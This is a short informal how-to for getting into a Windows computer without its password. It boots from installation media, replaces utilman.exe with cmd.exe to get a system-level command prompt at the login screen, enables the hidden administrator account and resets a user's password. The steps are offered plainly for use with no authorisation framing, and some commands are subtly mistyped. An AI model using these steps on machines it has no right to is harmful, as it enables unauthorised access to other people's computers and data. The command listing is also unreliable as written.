A windows computer has a pretty weak security, you can bypass the password prompt screen with a trick. 

What you need is an usb with a windows-10 installation, you start the machine and enter in the boot option menu by pressing the right button (F-something, most of the time). 

You enter in the special process of windows-10 installation and have multiple options : choose Troubleshoot, and then command prompt.

```shell
c:
cd system 32
copy utilman.exe \
copy cmd.exe utilman.exe
y
cmd.exe narrator.exe
y
```

Restart the computer.
Click the easy access button in the bottom-right of your screen.
Again, a command-prompt screen :

```shell
net user administrator /active:yes
```
Restart the pc to enable the account.
You have now a new account, administrator, and full access to the computer without knowing it's password.
You can also reset the password of the account, go again in the console-access :
```shell
net user #nameUser #passwordWanted
exit
```

Enter the password that you have selected : welcome to the computer.

## References

[Getting Into Any Windows Computer Without The Password](https://www.youtube.com/watch?v=itMECROHFQQ)